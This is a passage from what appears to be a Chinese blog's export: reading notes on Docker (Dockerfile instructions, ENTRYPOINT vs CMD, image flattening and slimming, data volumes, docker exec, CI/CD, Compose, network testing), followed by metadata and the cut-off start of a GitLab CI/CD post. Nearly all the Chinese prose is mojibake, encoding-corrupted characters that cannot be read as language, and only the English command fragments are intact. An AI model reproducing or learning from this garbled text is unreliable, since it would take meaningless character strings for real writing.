çš„ä½¿ç”¨Dockerfile çš„ç”¨é€”ï¼šä»ç»™å®šé•œåƒå¼€å§‹ï¼Œä¸º Docker æŒ‡å®šä¸€ç³»åˆ—çš„ shell å‘½ä»¤å’Œå…ƒæŒ‡ä»¤ï¼Œä»è€Œäº§å‡ºæœ€ç»ˆæ‰€éœ€çš„é•œåƒADD å’Œ COPY å‘½ä»¤çš„åŒºåˆ«ï¼šADD ä¼šè‡ªåŠ¨åœ¨é•œåƒå†…è§£å‹å½’æ¡£æ–‡ä»¶ï¼ˆå¦‚ .tar æˆ– .tar.gzï¼‰ï¼Œä½† COPY åªä¼šå•çº¯å¤åˆ¶æ–‡ä»¶ã€‚æŒ‰éœ€ä½¿ç”¨ã€‚ADD å‘½ä»¤å¯ä»¥å°†ä¸€ä¸ª URL å¯¹åº”çš„æ–‡ä»¶æ·»åŠ åˆ°å®¹å™¨ï¼Œä½†é€šè¿‡ URL ä¸‹è½½çš„æ–‡ä»¶ä¸ä¼šè‡ªåŠ¨è§£å‹ã€‚åœ¨ RUN å‘½ä»¤ä¸­ä½¿ç”¨å‘½ä»¤é“¾ï¼Œæœ‰åŠ©äºå‡å°é•œåƒå±‚æ•°ï¼Œç¼©å°å®¹å™¨ä½“ç§¯ã€‚è€Œä¸”å°† apt-get update å’Œ apt-get install å‘½ä»¤è¿èµ·æ¥ï¼Œå¯ä»¥ä¿è¯æ¯æ¬¡æ„å»ºæ—¶æ‰€è£…çš„è½¯ä»¶éƒ½æ˜¯æœ€æ–°çš„ï¼Œè€Œä¸ä¼šä»ä¹‹å‰ç¼“å­˜çš„ç´¢å¼•ä¸­å®‰è£…ä¸€ä¸ªæ—§ç‰ˆæœ¬è½¯ä»¶ã€‚å¦‚æœå¸Œæœ›æ‰‹åŠ¨æ¸…é™¤æŸä¸€å±‚çš„ç¼“å­˜ï¼Œå¯ä»¥åœ¨å‘½ä»¤åé¢åŠ ä¸€æ¡æ³¨é‡Šï¼Œå¦‚ ADD a /a # bust the cacheENTRYPOINT æŒ‡å®šäº†é•œåƒçš„å…¥å£ç‚¹ï¼Œç”¨æˆ·åœ¨ docker run æ—¶æ‰€å†™çš„å‘½ä»¤éƒ½æ˜¯å…¥å£ç‚¹æ‰§è¡Œæ–‡ä»¶çš„å‚æ•°ã€‚å¦‚æœä¸æƒ³ç”¨é•œåƒçš„å…¥å£ç‚¹ï¼Œåˆ™éœ€è¦åœ¨ docker run çš„æ—¶å€™æ·»åŠ  --entrypoint=xxxx é€‰é¡¹ä»¥é‡è½½å…¥å£ç‚¹ã€‚ENTRYPOINT å’Œ CMD çš„åŒºåˆ«ï¼šENTRYPOINT æŒ‡å®šäº†å®¹å™¨å…¥å£ç‚¹ï¼Œè€Œ CMD æŒ‡å®šäº†å…¥å£ç‚¹ç¨‹åºçš„é»˜è®¤å‚æ•°ã€‚å‡è®¾ Dockerfile ä¸ºï¼š123FROM ...ENTRYPOINT ['/entrypoint.sh']CMD ['xxx', 'yyy']docker run &lt;image&gt; æ—¶ï¼Œä¼šæ‰§è¡Œ /entrypoint.sh xxx yyyï¼›docker run &lt;image&gt; a b æ—¶ï¼Œa b ä¼šè¦†ç›–æ‰ CMD çš„å€¼ï¼Œè€Œä¸ä¼šè¦†ç›–å…¥å£ç‚¹ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œ /entrypoint.sh a bENTRYPOINT å’Œ CMD å‘½ä»¤çš„å‚æ•°å½¢å¼ï¼šè¿™ä¸¤ä¸ªå‘½ä»¤çš„å‚æ•°æœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ç§ä¸ºå­—ç¬¦ä¸²ç±»å‹ CMD /entrypoint.sh a bï¼Œä¸€ç§ä¸ºæ•°ç»„ç±»å‹ CMD ['/entrypoint.sh', 'a', 'b']ï¼Œå…¶ä¸­å­—ç¬¦ä¸²ç±»å‹çš„å‚æ•°åœ¨å®é™…æ‰§è¡Œå‰ä¼šåœ¨å‰é¢åŠ ä¸Š bash -c å‘½ä»¤å˜æˆ bash -c '/entrypoint.sh a b'ï¼Œä½†æ•°ç»„ç±»å‹çš„å‚æ•°åˆ™ä¸ä¼šæ”¹å˜ï¼Œç›´æ¥è¿è¡Œ /entrypoint.sh.ä¸¤ç§æ–¹æ³•æœ‰åˆ©æœ‰å¼Šï¼ŒæŒ‰éœ€ä½¿ç”¨ã€‚ å¯¹é•œåƒçš„æ“ä½œæ‰å¹³åŒ–é•œåƒå¦‚æœæƒ³å°†é•œåƒä¸­çš„å¤šå±‚åˆä¸ºä¸€å±‚ï¼ˆå¦‚åœ¨æŸå±‚ä¸­æ·»åŠ äº†å¯†é’¥åˆåœ¨åé¢åˆ é™¤ï¼‰ï¼Œåˆ™å¯ä»¥åœ¨è¿è¡Œå®¹å™¨ä¹‹åï¼Œä½¿ç”¨ docker export &lt;container&gt; | docker import some-image æ¥å°†å®¹å™¨çš„ç›®å½•ç»“æ„å¯¼å‡ºä¸º tar æ–‡ä»¶ï¼Œç„¶åå†ä»¥æ­¤é‡æ–°åˆ¶ä½œé•œåƒã€‚è¿™æ ·çš„é•œåƒåªä¼šæœ‰ä¸€å±‚ã€‚å¯¹å®¹å™¨è¿›è¡Œé€†å‘å·¥ç¨‹ä¹¦é‡Œæœ‰ä¸ªè„šæœ¬ï¼Œä½†æ˜¯ä¸èƒ½ç”¨ï¼›ä» StackOverFlow ä¸Šæ‰¾äº†ä¸€ä¸ªå¯ä»¥ç”¨ï¼Œä½†æ˜¯éƒ½ä¸å¦‚æˆ‘åœ¨ Portainer é‡Œçœ‹çš„å…¨ğŸ˜‚ç”¨è¿™äº›æ–¹æ³•å¯ä»¥é€†å‘å‡ºä¸€éƒ¨åˆ†å‘½ä»¤ï¼Œæ¯”å¦‚ MAINTAINER EXPOSE RUN ç­‰ï¼Œä½†ç”±äºæ„å»ºä¸Šä¸‹æ–‡çš„ç¼ºå¤±ï¼ŒADD å‘½ä»¤åªèƒ½æ˜¾ç¤ºå‡ºæ·»åŠ æ–‡ä»¶çš„å“ˆå¸Œå€¼å’Œå®¹å™¨å†…è·¯å¾„ï¼Œå¹¶ä¸èƒ½çŸ¥é“å…·ä½“æ·»åŠ çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆæ ·å­çš„ã€‚ å‡å°é•œåƒä½“ç§¯çš„æ–¹æ³•ä¸Šæ–‡æåˆ°çš„â€œæ‰å¹³åŒ–é•œåƒâ€æ–¹æ³•å¯ä»¥æœ‰æ•ˆåœ°å‡å°‘æ„å»ºæ—¶é•œåƒåˆ†å±‚æ‰€å¸¦æ¥çš„å¼€é”€ï¼›é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›æ–¹æ³•å¯ä»¥å‡å°å®¹å™¨çš„ä½“ç§¯ï¼šä½¿ç”¨ä¸€ä¸ªæ›´å°çš„åŸºç¡€é•œåƒï¼šubuntu æœ‰æ•°å MBï¼Œè€Œ alpine åªæœ‰å‡  MBè‡ªå·±äº‹åæ¸…ç†ï¼šå¯ä»¥åœ¨è£…å®Œè½¯ä»¶åŒ…ä»¥åç”¨ apt clean ç­‰å‘½ä»¤åˆ é™¤ç¼“å­˜å’Œè½¯ä»¶åŒ…ç´¢å¼•å°†ä¸€ç³»åˆ—å‘½ä»¤è®¾ç½®ä¸ºä¸€è¡Œï¼Œè¿™æ ·å¯ä»¥å‡å°‘å±‚æ•°ç¼–å†™ä¸€ä¸ªè„šæœ¬æ¥å®Œæˆå®‰è£…ï¼šåŸç†åŒ 3ï¼Œåªä¸è¿‡ä¸éœ€è¦åœ¨ Dockerfile ä¸­å†™å¤ªå¤šä»£ç åˆ é™¤ä¸å¿…è¦çš„è½¯ä»¶åŒ…å’Œæ–‡æ¡£æ–‡ä»¶ï¼šè¿›å…¥å®¹å™¨ä¸­ï¼Œåˆ é™¤æ‰€æœ‰ç”¨ä¸åˆ°çš„æ–‡ä»¶ï¼ˆç”šè‡³åŸºç¡€çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ï¼Œå¹¶å°†å®¹å™¨å¯¼å‡ºï¼ˆè‡³äºè¿™ä¹ˆæ‹¼å˜› ğŸŒšï¼‰ç‰¹æ®Šæƒ…å†µâ€”â€”ç³»ç»Ÿåªéœ€è¦ä¸€ä¸ªå¸¦é™æ€é“¾æ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚ go ç¼–è¯‘åçš„æ–‡ä»¶ï¼‰ï¼šç”¨ scratch å°±å¯ä»¥äº†ï¼Œç»å¯¹å°è¿›è¡Œé™æ€ç¼–è¯‘ï¼Œå¹¶å°†å¯æ‰§è¡Œæ–‡ä»¶æ”¾å…¥å¦ä¸€ä¸ªå®¹å™¨ä¸­ï¼šä¹¦ä¸­åšå‡ºäº† CMD [&quot;cat&quot;, &quot;/go/bin/go-web-server&quot;] docker run go-web-server &gt; go-web-server è¿™æ ·çš„çš„æ“ä½œç”¨æ¥è·¨é•œåƒå¤åˆ¶æ–‡ä»¶ã€‚ä½†è‡ªä» 17.05 ç‰ˆæœ¬å¼•å…¥å¤šé˜¶æ®µæ„å»ºï¼ˆmulti-stage buildï¼‰åï¼Œè¿™ä¸ªç¹ççš„è¿‡ç¨‹å·²ç»ä¸éœ€è¦äº†ï¼Œæ„å»ºç¨‹åºå’Œæ·»åŠ ç¨‹åºçš„æ“ä½œå¯ä»¥åœ¨ä¸€ä¸ª Dockerfile ä¸­å®Œæˆï¼Œå…·ä½“å¯ä»¥å‚è§ Docker æ–‡æ¡£ã€‚ è¿è¡Œå®¹å™¨ å®¹å™¨ä¸­çš„æœåŠ¡åœ¨ Docker çš„ä¸–ç•Œé‡Œï¼Œå…¬è®¤çš„æœ€ä½³å®è·µæ˜¯å°½å¯èƒ½å¤šåœ°æŠŠç³»ç»Ÿæ‹†åˆ†å¼€ï¼Œç›´åˆ°åœ¨æ¯ä¸ªå®¹å™¨ä¸Šéƒ½åªè¿è¡Œä¸€ä¸ªâ€œæœåŠ¡â€ï¼Œå¹¶ä¸”æ‰€æœ‰å®¹å™¨éƒ½é€šè¿‡é“¾æ¥ç›¸äº’è¿é€šã€‚å¦‚æœæƒ³åœ¨å®¹å™¨ä¸­ç®¡ç†å¤šä¸ªè¿›ç¨‹ï¼Œå¯ä»¥è€ƒè™‘ç”¨ supervisordï¼Œæˆ–è€…ä½¿ç”¨ phusion/baseimageã€‚å‚è§è¿™ç¯‡æ–‡ç« ã€‚ åœ¨ Docker ä¸­ä½¿ç”¨å¤–éƒ¨æ•°æ®å·é™¤äº†åœ¨ docker run æ—¶ä½¿ç”¨ -v å‚æ•°ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å®šä¹‰æ•°æ®å®¹å™¨ï¼Œç„¶ååœ¨è¿è¡Œå…¶å®ƒå®¹å™¨æ—¶ä½¿ç”¨ --volumes-from æ ‡å¿—ã€‚ä½¿ç”¨æ•°æ®å®¹å™¨å¯ä»¥åœ¨å¤šä¸ªå®¹å™¨å…±äº«æ•°æ®å·æ—¶æ›´æ–¹ä¾¿ç®¡ç†æ•°æ®å·ã€‚ä¾‹ï¼šéœ€è¦æ”¹å˜å…¶ä¸­ä¸€ä¸ªå®¹å™¨çš„æŒ‚åœ¨è·¯å¾„æ—¶ï¼Œå¦‚æœä¸ä½¿ç”¨æ•°æ®å®¹å™¨ï¼Œåˆ™éœ€è¦åœ¨å¤šä¸ªå®¹å™¨çš„å¯åŠ¨è„šæœ¬ä¸­ä¿®æ”¹ -v å‚æ•°çš„å€¼ï¼Œè€Œä½¿ç”¨æ•°æ®å®¹å™¨åï¼Œåªéœ€è¦æ›´æ”¹æ•°æ®å®¹å™¨å°±å¯ä»¥äº†ã€‚ä½¿ç”¨æ•°æ®å®¹å™¨ä¸­çš„å·å¹¶ä¸éœ€è¦è®©å®¹å™¨å¤„åœ¨è¿è¡ŒçŠ¶æ€ï¼Œæ‰€ä»¥å¯ä»¥åœ¨è¿è¡Œæ—¶ä½¿ç”¨ /bin/true ç­‰å‘½ä»¤ï¼Œè®©æ•°æ®å®¹å™¨åˆ›å»ºåç«‹å³é€€å‡ºã€‚æ³¨æ„ï¼šå¤šä¸ªå®¹å™¨å…±äº«æ•°æ®å®¹å™¨æ—¶ï¼ŒåŒæ—¶å†™å…¥åŒä¸€æ–‡ä»¶å¯èƒ½ä¼šå¯¼è‡´æ•°æ®å·ä¸­çš„æ•°æ®è¢«è¦†ç›–æˆ–æˆªæ–­ã€‚PS: åˆšåˆšé‡åˆ°äº†ä¸€ä¸ªå®¿ä¸»æœºæ–‡ä»¶æ›´æ”¹ä½†æœªåŒæ­¥è‡³å®¹å™¨çš„é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒè¿™ä¸ªå¸–å­æœ€åé¢çš„è§£é‡Šã€‚ åˆ é™¤æ•°æ®å·ä¸ºäº†ä¿è¯æ•°æ®å®‰å…¨ï¼ŒDocker åœ¨åˆ é™¤å®¹å™¨æ—¶ä¸ä¼šè‡ªåŠ¨åˆ é™¤å®¹å™¨é”å…³è”çš„æ•°æ®å·ï¼Œç”¨æˆ·å¯ä»¥é€‰æ‹©æ‰‹åŠ¨å°†è¿™äº›æ•°æ®å·æ¸…é™¤å¦‚æœå¸Œæœ›åˆ é™¤å®¹å™¨æ—¶è‡ªåŠ¨åˆ é™¤æ•°æ®å·ï¼Œå¯ä»¥åœ¨ docker rm ä¸­åŠ å…¥ -v æ ‡å¿—ã€‚ è§£ç»‘ï¼ˆdetachï¼‰å®¹å™¨å¦‚æœæƒ³è¦ä»ä¸€ä¸ªå®¹å™¨çš„äº¤äº’ä¼šè¯ä¸­é€€å‡ºï¼Œå¯ä»¥æŒ‰ Ctrl+P Ctrl+Qï¼ŒDocker æ£€æµ‹åˆ°è¿™ä¸ªæŒ‰é”®åºåˆ—åï¼Œå°±ä¼šè‡ªåŠ¨è§£ç»‘å®¹å™¨ï¼Œä½†åŒæ—¶å®¹å™¨ä¾æ—§ä¼šåœ¨åå°è¿è¡Œã€‚å¦‚æœæƒ³é‡æ–°å›åˆ°å®¹å™¨ä¸­ï¼Œå¯ä»¥ç”¨ docker attach å‘½ä»¤ã€‚è¿™ä¸ªæ“ä½œå’Œ docker run -d ç„¶å docker exec æœ‰ç‚¹ç›¸ä¼¼ï¼Œä½†ä¸Šé¢çš„æ–¹æ³•æ“çºµçš„æ˜¯é•œåƒå†… PID ä¸º 1 çš„â€œä¸»è¿›ç¨‹â€ï¼Œè€Œ exec å‘½ä»¤ä¼šæ–°å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ç»™å½“å‰ tty ä½¿ç”¨ã€‚ åœ¨è¿è¡Œçš„å®¹å™¨é‡Œæ‰§è¡Œä¸€äº›å‘½ä»¤å¦‚æœå®¹å™¨ä¸»è¿›ç¨‹ä¸æ˜¯ shell ç¨‹åºè€Œæ˜¯ä¸€äº›åˆ«çš„ï¼Œå¯ä»¥ç”¨ docker exec å‘½ä»¤è¿›å…¥å®¹å™¨ï¼Œè¿™æ · Docker ä¼šåœ¨å®¹å™¨ä¸­æ–°å¼€ä¸€ä¸ªè¿›ç¨‹ç»™ç”¨æˆ·æ¥ä½¿ç”¨ã€‚docker exec æœ‰ä¸‰ç§â€œæ¨¡å¼â€ï¼šåŸºæœ¬çš„è¿è¡Œæ¨¡å¼ï¼ŒåŒæ­¥è¿è¡Œå‘½ä»¤ï¼ŒæˆåŠŸåé€€å‡ºï¼Œå¦‚ docker exec psï¼›å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼ï¼Œç«‹å³é€€å‡ºï¼Œå‘½ä»¤åœ¨åå°æ‰§è¡Œï¼Œå¦‚ docker exec -d nginx -g daemon offï¼›äº¤äº’æ¨¡å¼ï¼Œå°±æ˜¯ -it çš„æ ·å­å•¦ï¼Œå…è®¸ä¸è¿›ç¨‹è¿›è¡Œäº¤äº’ï¼Œå¦‚ docker exec -it bash ä½¿ç”¨æŠ€å·§å¦‚æœæƒ³è®©é•œåƒç«‹åˆ»å®Œæˆä»»åŠ¡é€€å‡ºï¼Œå¯ä»¥ä½¿ç”¨ /bin/true ä½œä¸ºé•œåƒå¯åŠ¨å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥ç”¨ touch /somefileï¼Œæˆ‘æ›´å–œæ¬¢ç”¨ç¬¬ä¸€ä¸ªï¼›å¦‚æœæƒ³è®©é•œåƒå¯åŠ¨åç«‹å³æŒ‚èµ·ï¼Œå¯ä»¥ä½¿ç”¨ sleep infinityï¼Œæˆ– tail -f /etc/hosts ç­‰ä½œä¸ºå¯åŠ¨å‘½ä»¤ï¼› 3. ç¬¬ä¸‰éƒ¨åˆ†ï¼šDocker ä¸ DevOpsç¬¬ä¸‰éƒ¨åˆ†ä¸»è¦æ¶‰åŠåˆ°å°† Docker åº”ç”¨è‡³ DevOps æµæ°´çº¿ä¸­ï¼Œå¹¶åœ¨æœ¬åœ°åˆ©ç”¨ Docker æ¨¡æ‹Ÿä¸€äº›ç”Ÿäº§ç¯å¢ƒçš„ç½‘ç»œæ¡ä»¶ï¼ˆå¦‚é«˜å»¶è¿Ÿã€ä¸¢åŒ…ç­‰ï¼‰æ¥å¯¹æœåŠ¡çš„å¥å£®æ€§è¿›è¡Œæµ‹è¯•ã€‚ç”±äºè¿˜æ²¡æœ‰å¯¹è¿™ä¸€éƒ¨åˆ†è¿›è¡Œå®è·µï¼Œæ‰€ä»¥è¿™éƒ¨åˆ†çš„å†…å®¹åªä¼šè¿›è¡Œä¸€äº›æ‘˜æŠ„å’Œæ€»ç»“ã€‚åˆæ˜¯åŸºæœ¬æ¦‚å¿µï¼šæŒç»­é›†æˆï¼šæŒç»­é›†æˆæ˜¯æŒ‡ç”¨äºåŠ å¿«æµæ°´çº¿çš„ä¸€ä¸ªè½¯ä»¶ç”Ÿå‘½å‘¨æœŸç­–ç•¥ã€‚åœ¨æ¯æ¬¡ä»£ç åº“å‘ç”Ÿé‡å¤§ä¿®æ”¹æ—¶ï¼Œé€šè¿‡è‡ªåŠ¨é‡æ–°è¿è¡Œæµ‹è¯•ï¼Œå¯ä»¥è·å¾—æ›´å¿«ä¸”ç¨³å®šçš„äº¤ä»˜ï¼Œå› ä¸ºè¢«äº¤ä»˜çš„è½¯ä»¶å…·æœ‰ä¸€ä¸ªåŸºç¡€å±‚æ¬¡çš„ç¨³å®šæ€§ã€‚Docker çš„å¯ç§»æ¤æ€§å’Œè½»é‡æ€§ï¼Œä½¿å…¶æˆä¸º CI ä»èŠ‚ç‚¹ï¼ˆä¸€å°ä¾› CI ä¸»æœåŠ¡å™¨è¿æ¥ä»¥ä¾¿æ‰§è¡Œæ„å»ºçš„æœºå™¨ï¼‰çš„ç†æƒ³é€‰æ‹©ã€‚ä¸è™šæ‹Ÿæœºä»èŠ‚ç‚¹ç›¸æ¯”ï¼ŒDocker CI ä»èŠ‚ç‚¹å‘å‰è¿ˆäº†ä¸€å¤§æ­¥ï¼ˆç›¸å¯¹æ„å»ºè£¸æœºæ›´æ˜¯ä¸€ä¸ªé£è·ƒï¼‰ã€‚å®ƒå¯ä»¥ä½¿ç”¨ä¸€å°å®¿ä¸»æœºåœ¨å¤šç§ç¯å¢ƒä¸Šè¿›è¡Œæ„å»ºã€å¿«é€Ÿé”€æ¯å¹¶åˆ›å»ºæ•´æ´çš„ç¯å¢ƒæ¥ç¡®ä¿ä¸å—æ±¡æŸ“çš„æ„å»ºï¼Œæ¥ä½¿ç”¨æ‰€æœ‰ç†Ÿæ‚‰çš„ Docker å·¥å…·æ¥ç®¡ç†æ„å»ºç¯å¢ƒã€‚ CI æŠ€å·§å¦‚æœæ˜¯å¼€æºé¡¹ç›®ï¼Œå¯ä»¥è€ƒè™‘ç”¨ Docker Hub å·¥ä½œæµå®Œæˆè‡ªåŠ¨æ„å»ºï¼›å¦‚æœæ˜¯æœ¬åœ°æ„å»ºï¼Œå¯ä»¥ä¸ºåŒ…ç®¡ç†å™¨å®‰è£…ä¸€ä¸ª Squid ä»£ç†ï¼Œé€šè¿‡ç¼“å­˜è½¯ä»¶åŒ…æ¥åŠ å¿«è½¯ä»¶ä¸‹è½½é€Ÿåº¦ï¼ŒåŒæ—¶èŠ‚çœæµé‡ã€‚ CI/CD æµæ°´çº¿CD èƒŒåçš„å…³é”®æ€æƒ³ä¹‹ä¸€æ˜¯æ„å»ºæå‡ã€‚æ„å»ºæå‡æ˜¯æŒ‡æµæ°´çº¿çš„æ¯ä¸ªåœºæ™¯ï¼ˆç”¨æˆ·éªŒæ”¶æµ‹è¯•ã€é›†æˆæµ‹è¯•ä»¥åŠæ€§èƒ½æµ‹è¯•ï¼‰åªæœ‰åœ¨å‰ä¸€ä¸ªåœºæ™¯æˆåŠŸæ—¶æ‰èƒ½è§¦å‘ä¸‹ä¸€ä¸ªåœºæ™¯ã€‚ â€œDocker å¥‘çº¦â€åœ¨ CD å…¨è¿‡ç¨‹ä¸­ï¼Œä» CI äº§å‡ºçš„é•œåƒå¿…é¡»æ˜¯æœ€ç»ˆçš„ã€ä¸å¯ä¿®æ”¹çš„ã€‚è¿™æ ·ï¼Œåœ¨ä¸åŒå›¢é˜Ÿã€ä¸åŒç¯å¢ƒä¸­è¿è¡Œçš„ä»£ç å’Œä¾èµ–æ‰å¯ä»¥è¢«å½»åº•å›ºåŒ–ï¼Œæœ‰åˆ©äºé—®é¢˜çš„å¤ç°åŠæ’æŸ¥ã€‚ å¾®æœåŠ¡æ¶æ„etcd å¯ä½œä¸ºç¯å¢ƒçš„ä¸­å¤®é…ç½®å­˜å‚¨ï¼ŒæœåŠ¡å‘ç°å¯ä»¥ç”¨ etcdã€confd åŠ nginx çš„ç»„åˆæ¥å®ç°ã€‚ å…±äº« Docker å¯¹è±¡docker export å’Œ docker save å‘½ä»¤çš„åŒºåˆ«ï¼šdocker export ä½œç”¨äºå®¹å™¨ï¼Œè€Œ docker save ä½œç”¨äºé•œåƒï¼›docker export ä¼šå°†å®¹å™¨çš„æ–‡ä»¶ç³»ç»Ÿä»¥å¹³é¢åŒ–å½¢å¼å¯¼å‡ºï¼Œé•œåƒçš„å…ƒä¿¡æ¯å’Œå±‚æ¬¡ç»“æ„ç»“æ„ä¼šè¢«å¿½ç•¥ï¼Œè€Œ docker save ä¼šå°†é•œåƒçš„æ‰€æœ‰ä¿¡æ¯å¯¼å‡ºï¼ŒåŒ…æ‹¬é•œåƒçš„å…ƒä¿¡æ¯ï¼Œä»¥åŠæ¯ä¸€å±‚çš„å†…å®¹ã€‚é™„ä¸€ä¸ªä¹¦ä¸­çš„å¯¹æ¯”è¡¨æ ¼ï¼Œå¯¹é‡Œé¢çš„ä¸€äº›å†…å®¹ä½œäº†æ›´æ”¹ï¼šå‘½ä»¤ç›®æ ‡ç±»å‹å†…å®¹æ¥æºäº§å‡ºç‰©exportå®¹å™¨æ–‡ä»¶ç³»ç»Ÿå®¹å™¨TAR åŒ…importå¹³é¢æ–‡ä»¶ç³»ç»ŸTAR åŒ…Docker é•œåƒsaveDocker é•œåƒï¼ˆå¸¦å†å²è®°å½•ï¼‰Docker é•œåƒTAR åŒ…loadDocker é•œåƒï¼ˆå¸¦å†å²è®°å½•)TAR åŒ…Docker é•œåƒ ç½‘ç»œæ¨¡æ‹Ÿï¼šæ— ç—›çš„ç°å®ç¯å¢ƒæµ‹è¯• Docker Compose: ç®¡ç†å®¹å™¨é—´é“¾æ¥ä¹‹å‰å†™åˆ°å¯ä»¥ç”¨é“¾æ¥çš„æ–¹å¼é“¾æ¥å®¹å™¨ä»è€Œå®ç°å®¹å™¨é—´é€šä¿¡ï¼Œä½†é“¾æ¥çš„é…ç½®æ¯”è¾ƒç¹çï¼Œè€Œä¸”å‡ºç°é—®é¢˜éš¾ä»¥æ¢å¤ï¼ˆéœ€è¦ä¾åºé‡å¯æ‰€æœ‰å®¹å™¨æ‰èƒ½é‡ç½®æ‰€æœ‰é“¾æ¥ï¼‰ã€‚æ‰€ä»¥ï¼Œå¦‚æœéœ€è¦å¯åŠ¨ä¸€ç»„äº’ç›¸è¿æ¥çš„å®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨ Docker Compose.Docker Compose çš„ YAML é…ç½®å¯ä»¥ä½¿å®¹å™¨çš„ç®¡ç†å˜å¾—ååˆ†ç®€å•ï¼Œå®ƒæŠŠç¼–æ’å®¹å™¨çš„å¤æ‚äº‹åŠ¡ä»æ‰‹å·¥ä¸”æ˜“å‡ºé”™çš„è¿‡ç¨‹å˜æˆäº†å¯é€šè¿‡æºä»£ç æ§åˆ¶çš„æ›´å®‰å…¨å’Œè‡ªåŠ¨åŒ–çš„è¿‡ç¨‹ã€‚12345678echo-server: image: server expose: - \"2000\"client: build: . # ä½¿ç”¨ ./Dockerfile æ¥æ„å»ºé•œåƒ links: - echo-server:talkto # è¿™é‡Œçš„å‚æ•°ä¸ --link çš„å‚æ•°ä¸€è‡´docker-compose up åï¼Œclient å®¹å™¨å°±å¯ä»¥é€šè¿‡ talkto çš„ host ä¸ echo-server é€šä¿¡ã€‚ä½†æ˜¯ï¼Œè¿™é‡Œçš„ host è§£ææ˜¯é™æ€çš„ï¼Œå¦‚æœå¸Œæœ›åœ¨å®¹å™¨å†…ä½¿ç”¨å¯åŠ¨æ€é…ç½®çš„ DNSï¼Œå¯ä»¥å¼•å…¥ resolvable. ç½‘ç»œæµ‹è¯•æƒ³è¦ä¸ºå•ä¸ªå®¹å™¨åº”ç”¨ä¸åŒçš„ç½‘ç»œçŠ¶å†µï¼Œå¯ä»¥ç”¨ Comcastæƒ³è¦å¯¹å¤§é‡å®¹å™¨è¿›è¡Œç½‘ç»œçŠ¶å†µç¼–æ’è®¾ç½®ï¼Œå¯ä»¥ç”¨ Blockadeæƒ³è¦è·¨å®¿ä¸»æœºè¿›è¡Œå®¹å™¨é—´æ— ç¼é€šä¿¡ï¼Œå¯ä»¥ä½¿ç”¨ Weave æ„å»ºåŸºåº•ç½‘ç»œdocker network æä¾›è¯•éªŒæ€§çš„ç½‘ç»œæ„å»ºåŠŸèƒ½å•Šâ€¦éšç€å®¹å™¨ç¼–æ’å’Œ Service Mesh æ¡†æ¶çš„å‡ºç°ï¼Œè²Œä¼¼è¿™äº›é—®é¢˜éƒ½å¯ä»¥æ›´è½»æ¾åœ°è§£å†³äº† _(:Ğ·ã€âˆ )_","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://blog.stdioa.com/tags/Docker/"},{"name":"è¯»ä¹¦","slug":"è¯»ä¹¦","permalink":"https://blog.stdioa.com/tags/è¯»ä¹¦/"}]},{"title":"GitLab CI/CD: è¾…åŠ©å·¥å…·","slug":"gitlab-cicd-auxiliary","date":"2018-07-15T12:21:00.000Z","updated":"2018-11-30T15:35:21.204Z","comments":true,"path":"2018/07/gitlab-cicd-auxiliary/","link":"","permalink":"https://blog.stdioa.com/2018/07/gitlab-cicd-auxiliary/","excerpt":"æœ¬æ–‡ä¼šè®²ä¸€äº›åœ¨ GitLab CI/CD ä¸­å¯èƒ½ä¼šç”¨åˆ°çš„è¾…åŠ©å·¥å…·ï¼ŒåŒ…æ‹¬éšè—ä»»åŠ¡ã€ä¾èµ–ç¼“å­˜ã€å®šæ—¶ä»»åŠ¡ä»¥åŠéƒ¨ç½²ç¯å¢ƒã€‚","text":"æœ¬æ–‡ä¼šè®²ä¸€äº›åœ¨ GitLab CI/CD ä¸­å¯èƒ½ä¼šç”¨åˆ°çš„è¾…åŠ©å·¥å…·ï¼ŒåŒ…æ‹¬éšè—ä»»åŠ¡ã€ä¾èµ–ç¼“å­˜ã€å®šæ—¶ä»»åŠ¡ä»¥åŠéƒ¨ç½²ç¯å¢ƒã€‚ 0. TL;DRHidden keys (jobs)Cache dependencies in GitLab CI/CDPipeline SchedulesIntroduction to environments and deployments 1. éšè—ä»»åŠ¡å…ˆè®²ä¸ªç®€å•çš„ã€‚æœ‰çš„æ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨ Pipeline ä¸­è·³è¿‡æŸäº›ä»»åŠ¡ï¼Œé€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ç”¨ä»»åŠ¡å®šä¹‰ä¸­çš„ when å’Œ except å±æ€§æ¥æ§åˆ¶ä»»åŠ¡æ˜¯å¦æ˜¾ç¤ºã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³æš‚æ—¶åˆ æ‰è¿™ä¸ªä»»åŠ¡æ€ä¹ˆåŠï¼Ÿä¸€ç§æ–¹æ³•ï¼Œæ˜¯åœ¨ .gitlab-ci.yml ä¸­åˆ æ‰æˆ–æ³¨é‡Šæ‰è¿™ä¸ªä»»åŠ¡ï¼›å¦ä¸€ç§åšæ³•æ˜¯ï¼Œç›´æ¥åœ¨ä»»åŠ¡å®šä¹‰çš„ key ä¸­åŠ ä¸ªç‚¹å·(.)ï¼Œå°±å¯ä»¥æŠŠè¿™ä¸ªä»»åŠ¡éšè—èµ·æ¥ã€‚è¿™ç§åšæ³•å’Œ Linux ä¸­éšè—æ–‡ä»¶çš„æ–¹æ³•éå¸¸ç›¸ä¼¼ï¼Œä¹Ÿæ˜¯ GitLab å®˜æ–¹æ¨èçš„åšæ³•ã€‚ 2. ä¾èµ–ç¼“å­˜ä¹‹å‰æˆ‘ä»¬çš„é¡¹ç›®ä¾èµ–æ˜¯ç›´æ¥æ‰“åœ¨ Docker é•œåƒé‡Œçš„ï¼Œä½†æ˜¯åæ¥æŠ€æœ¯æ›´æ–°åï¼Œå•å…ƒæµ‹è¯•ä½¿ç”¨çš„é•œåƒå˜æˆäº†æ„å»ºç”¨çš„ 